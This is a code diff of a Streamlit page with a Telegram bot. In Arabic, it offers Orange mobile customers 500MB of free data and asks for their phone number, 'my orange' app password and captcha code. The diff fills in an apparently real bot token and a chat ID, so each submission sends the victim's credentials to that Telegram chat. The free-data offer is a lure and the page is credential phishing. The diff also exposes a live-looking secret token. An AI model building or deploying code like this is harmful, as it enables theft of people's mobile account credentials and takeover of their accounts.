@@ -2,7 +2,7 @@ import streamlit as st
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
 
 # Replace 'YOUR_TOKEN' with your Telegram Bot token
-TOKEN = 'YOUR_TOKEN'
+TOKEN = '7060312406:AAGqNhOh6s4RVufoV4Qp1eq8D0DNNDfDiZs'
 
 def start(update, context):
     update.message.reply_text('مرحبًا! قم بإدخال رقم تليفون اورانج وباسورد تطبيق my orange.')
@@ -115,5 +115,5 @@ captcha_response = st.text_input("كود الكباتشا")
 if st.button("add 500mb"):
     bot_message = f"رقم التليفون: {number}\nباسورد تطبيق my orange: {password}\nكود الكباتشا: {captcha_response}"
     updater = Updater(TOKEN)
-    updater.bot.send_message(chat_id='YOUR_CHAT_ID', text=bot_message)
+    updater.bot.send_message(chat_id='5939899289', text=bot_message)
     st.write("تم إرسال المعلومات بنجاح إلى البوت على التليجرام.")
